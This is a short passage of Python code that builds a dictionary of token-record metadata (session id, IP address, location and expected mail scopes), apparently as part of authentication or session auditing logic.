        "session_id": getattr(token_record, "session_id", None),
        "ip_address": getattr(token_record, "ip_address", None),
        "location": getattr(token_record, "location", None),
        "expected_mail_scopes": ALL_MAIL_SCOPES,
    }